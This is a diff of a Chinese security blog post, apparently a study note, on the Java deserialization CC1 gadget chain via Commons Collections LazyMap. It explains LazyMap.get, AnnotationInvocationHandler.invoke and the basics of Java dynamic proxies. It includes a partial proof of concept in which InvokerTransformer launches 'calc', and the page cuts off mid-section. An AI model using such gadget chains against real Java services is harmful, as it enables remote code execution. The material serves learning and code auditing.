@@ -1,18 +1,19 @@
 <!DOCTYPE html>
 <html lang="zh-cn" dir="ltr">
     <head><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="">
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="Java反序列化CC1链---LazyMap">
 <title>Java代码审计CC1链 LazyMap</title>
 
 <link rel='canonical' href='https://lserein.github.io/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1cc1%E9%93%BE-lazymap/'>
 
 <link rel="stylesheet" href="/scss/style.min.6a692fd055deae459f2a9767f57f3855ba80cafd5041317f24f7360f6ca47cdf.css"><meta property='og:title' content="Java代码审计CC1链 LazyMap">
-<meta property='og:description' content="">
+<meta property='og:description' content="Java反序列化CC1链---LazyMap">
 <meta property='og:url' content='https://lserein.github.io/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1cc1%E9%93%BE-lazymap/'>
 <meta property='og:site_name' content='Lsec&#39;s Blog'>
-<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-12-09T17:39:20&#43;08:00'/><meta property='article:modified_time' content='2025-12-09T17:45:40&#43;08:00'/>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-12-09T17:39:20&#43;08:00'/><meta property='article:modified_time' content='2025-12-11T15:31:04&#43;08:00'/><meta property='og:image' content='https://lserein.github.io/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1cc1%E9%93%BE-lazymap/logo.png' />
 <meta name="twitter:title" content="Java代码审计CC1链 LazyMap">
-<meta name="twitter:description" content="">
+<meta name="twitter:description" content="Java反序列化CC1链---LazyMap"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://lserein.github.io/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1cc1%E9%93%BE-lazymap/logo.png' />
     <link rel="shortcut icon" href="/favicon.ico" />
 
     </head>
@@ -245,13 +246,80 @@
     </ol>
 </aside>
 
-    
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li>
+      <ol>
+        <li><a href="#1如何让factoryinvokertransformer">1.如何让factory=InvokerTransformer</a></li>
+        <li><a href="#2谁可以调用get方法annotationinvocationhandler">2.谁可以调用get方法&mdash;AnnotationInvocationHandler</a></li>
+        <li><a href="#3invoke方法java动态代理">3.invoke方法&mdash;Java动态代理</a>
+          <ol>
+            <li><a href="#31java动态代理基础">3.1.Java动态代理基础</a></li>
+          </ol>
+        </li>
+        <li><a href="#4最终流程">4.最终流程</a></li>
+        <li><a href="#5为什么-ysoserial-使用-lazymap-而非-transformedmap">5.为什么 ysoserial 使用 LazyMap 而非 TransformedMap？</a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
 
             <main class="main full-width">
-    <article class="main-article">
+    <article class="has-image main-article">
     <header class="article-header">
+        <div class="article-image">
+            <a href="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1cc1%E9%93%BE-lazymap/">
+                <img src="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1cc1%E9%93%BE-lazymap/logo_hu_d2db8d757d18093e.png"
+                        srcset="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1cc1%E9%93%BE-lazymap/logo_hu_d2db8d757d18093e.png 800w, /p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1cc1%E9%93%BE-lazymap/logo_hu_51ef03d9f7577ea4.png 1600w"
+                        width="800" 
+                        height="500" 
+                        loading="lazy"
+                        alt="Featured image of post Java代码审计CC1链 LazyMap" />
+                
+            </a>
+        </div>
+    
 
     <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" style="background-color: #2a9d8f; color: #fff;">
+                学习笔记
+            </a>
+        
+            <a href="/categories/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="background-color: #2a9d8f; color: #fff;">
+                Java代码审计
+            </a>
+        
+    </header>
     
 
     <div class="article-title-wrapper">
@@ -259,6 +327,10 @@
             <a href="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1cc1%E9%93%BE-lazymap/">Java代码审计CC1链 LazyMap</a>
         </h2>
     
+        
+        <h3 class="article-subtitle">
+            Java反序列化CC1链---LazyMap
+        </h3>
         
     </div>
 
@@ -293,7 +365,7 @@
 
 
                 <time class="article-time--reading">
-                    阅读时长: 0 分钟
+                    阅读时长: 5 分钟
                 </time>
             </div>
         
@@ -308,7 +380,570 @@
     <section class="article-content">
     
     
-    
+    <p>在上文TransformedMap文章中，我们知道除了TransformedMap外还有一个LazyMap也实现了transform方法</p>
+<p><img src="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1cc1%E9%93%BE-lazymap/image/1.png"
+	width="2434"
+	height="1327"
+	srcset="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1cc1%E9%93%BE-lazymap/image/1_hu_f1dd71a3c8669168.png 480w, /p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1cc1%E9%93%BE-lazymap/image/1_hu_647937f0ea4a940.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="183"
+		data-flex-basis="440px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="nf">get</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">key</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// create value for key if key is not currently in the map</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">map</span><span class="p">.</span><span class="na">containsKey</span><span class="p">(</span><span class="n">key</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="kc">false</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Object</span><span class="w"> </span><span class="n">value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">factory</span><span class="p">.</span><span class="na">transform</span><span class="p">(</span><span class="n">key</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">map</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="n">key</span><span class="p">,</span><span class="w"> </span><span class="n">value</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="n">value</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">map</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">key</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>我们知道如果想要执行命令，那么</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">factory</span><span class="p">.</span><span class="na">transform</span><span class="p">(</span><span class="n">key</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">就要变为以下形式</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">invoketransform</span><span class="p">.</span><span class="na">transform</span><span class="p">(</span><span class="n">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">InvokerTransformer</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="1如何让factoryinvokertransformer">1.如何让factory=InvokerTransformer
+</h3><p>我们发现factory是LazyMap类中的一个属性，由构造方法传入，但是由于构造方法是受保护的，只能类的内部调用，所以我们得找有没有public修饰的方法，并且调用了这个构造方法</p>
+<p>我们发现decorate方法在内部实现了构造方法，并且传参为我们自己可控的</p>
+<p><img src="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1cc1%E9%93%BE-lazymap/image/2.png"
+	width="1989"
+	height="1113"
+	srcset="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1cc1%E9%93%BE-lazymap/image/2_hu_1b717b1b6bb4b227.png 480w, /p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1cc1%E9%93%BE-lazymap/image/2_hu_728bf0d3f7f7a306.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="178"
+		data-flex-basis="428px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">cn.itcast.demo.cc1</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.Transformer</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.InvokerTransformer</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.map.LazyMap</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.HashMap</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.Map</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">cc1lazymap</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">InvokerTransformer</span><span class="w"> </span><span class="n">invokerTransformer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;exec&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;calc&#34;</span><span class="p">});</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//exec.transform(Runtime.getRuntime());</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">HashMap</span><span class="o">&lt;</span><span class="n">Object</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="o">&gt;</span><span class="w"> </span><span class="n">map</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">HashMap</span><span class="o">&lt;&gt;</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Map</span><span class="w"> </span><span class="n">decorate</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">LazyMap</span><span class="p">.</span><span class="na">decorate</span><span class="p">(</span><span class="n">map</span><span class="p">,</span><span class="w"> </span><span class="n">invokerTransformer</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">decorate</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">());</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1cc1%E9%93%BE-lazymap/image/3.png"
+	width="1983"
+	height="1170"
+	srcset="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1cc1%E9%93%BE-lazymap/image/3_hu_2903e7c95fb48920.png 480w, /p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1cc1%E9%93%BE-lazymap/image/3_hu_fd56babbcd9bf1cf.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="169"
+		data-flex-basis="406px"
+	
+></p>
+<h3 id="2谁可以调用get方法annotationinvocationhandler">2.谁可以调用get方法&mdash;AnnotationInvocationHandler
+</h3><p>最好这个类是入口类，readobject方法里调用了get方法，并且可序列化了，但是查的话发现有2000多个类实现了get方法</p>
+<p><img src="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1cc1%E9%93%BE-lazymap/image/4.png"
+	width="2355"
+	height="1117"
+	srcset="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1cc1%E9%93%BE-lazymap/image/4_hu_bfe3cbf2e91c37a4.png 480w, /p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1cc1%E9%93%BE-lazymap/image/4_hu_af237d1a42136281.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="210"
+		data-flex-basis="505px"
+	
+></p>
+<p>这边入口类其实还是AnnotationInvocationHandler，但是不是他的readobject方法调用了get，而是Invoke方法调用了get</p>
+<p><img src="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1cc1%E9%93%BE-lazymap/image/5.png"
+	width="1969"
+	height="1246"
+	srcset="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1cc1%E9%93%BE-lazymap/image/5_hu_cc1d4b2fc35bbac5.png 480w, /p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1cc1%E9%93%BE-lazymap/image/5_hu_5232efd1cc5300f6.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="158"
+		data-flex-basis="379px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">//解释代理对象，方法名，参数</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="nf">invoke</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">proxy</span><span class="p">,</span><span class="w"> </span><span class="n">Method</span><span class="w"> </span><span class="n">method</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//获取方法名</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">member</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">method</span><span class="p">.</span><span class="na">getName</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//获取参数类型</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Class</span><span class="o">&lt;?&gt;[]</span><span class="w"> </span><span class="n">paramTypes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">method</span><span class="p">.</span><span class="na">getParameterTypes</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// Handle Object and Annotation methods</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//判断方法名是不是equals，并且参数类型长度为1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">member</span><span class="p">.</span><span class="na">equals</span><span class="p">(</span><span class="s">&#34;equals&#34;</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">paramTypes</span><span class="p">.</span><span class="na">length</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">1</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">paramTypes</span><span class="o">[</span><span class="n">0</span><span class="o">]</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">Object</span><span class="p">.</span><span class="na">class</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="n">equalsImpl</span><span class="p">(</span><span class="n">args</span><span class="o">[</span><span class="n">0</span><span class="o">]</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">paramTypes</span><span class="p">.</span><span class="na">length</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">0</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">AssertionError</span><span class="p">(</span><span class="s">&#34;Too many parameters for an annotation method&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//遍历方法，判断方法是不是toString方法</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">switch</span><span class="p">(</span><span class="n">member</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">case</span><span class="w"> </span><span class="s">&#34;toString&#34;</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="n">toStringImpl</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">case</span><span class="w"> </span><span class="s">&#34;hashCode&#34;</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="n">hashCodeImpl</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">case</span><span class="w"> </span><span class="s">&#34;annotationType&#34;</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="n">type</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// Handle annotation member accessors</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Object</span><span class="w"> </span><span class="n">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">memberValues</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">member</span><span class="p">);</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="3invoke方法java动态代理">3.invoke方法&mdash;Java动态代理
+</h3><h4 id="31java动态代理基础">3.1.Java动态代理基础
+</h4><p>什么是Java的动态代理？Java 的<strong>动态代理（Dynamic Proxy）</strong> 是 Java 反射机制提供的一种强大功能，它允许你在<strong>运行时动态创建一个实现指定接口的代理对象</strong>，并在调用该对象的方法时插入自定义逻辑</p>
+<p>代理可以干什么？<strong>代理可以无侵入式的给对象增强属性</strong>（如日志、权限检查、事务控制）</p>
+<p>代理长什么样？<strong>对象长什么样代理就长什么样，代理是一个接口，对象需要实现代理里面的方法</strong></p>
+<p><img src="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1cc1%E9%93%BE-lazymap/image/6.png"
+	width="2124"
+	height="1025"
+	srcset="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1cc1%E9%93%BE-lazymap/image/6_hu_43f0b5469bbca8a7.png 480w, /p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1cc1%E9%93%BE-lazymap/image/6_hu_ded8add9f759788d.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="207"
+		data-flex-basis="497px"
+	
+></p>
+<p>案例</p>
+<p>//UserService接口相当于经纪人，是一个中介</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">cn.itcast.demo.Proxy</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//UserService接口相当于经纪人，是一个中介</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">interface</span> <span class="nc">UserService</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kt">void</span><span class="w"> </span><span class="nf">sing</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">name</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kt">void</span><span class="w"> </span><span class="nf">dance</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">name</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>//UserServiceImpl实现类，相当于明星</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">cn.itcast.demo.Proxy</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">UserServiceImpl</span><span class="w"> </span><span class="kd">implements</span><span class="w"> </span><span class="n">UserService</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@Override</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">sing</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">name</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">name</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&#34;正在唱歌&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@Override</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">dance</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">name</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">name</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&#34;正在跳舞&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>//当粉丝想要歌手唱歌时，得先找经纪人，经纪人需要准备舞台话筒</p>
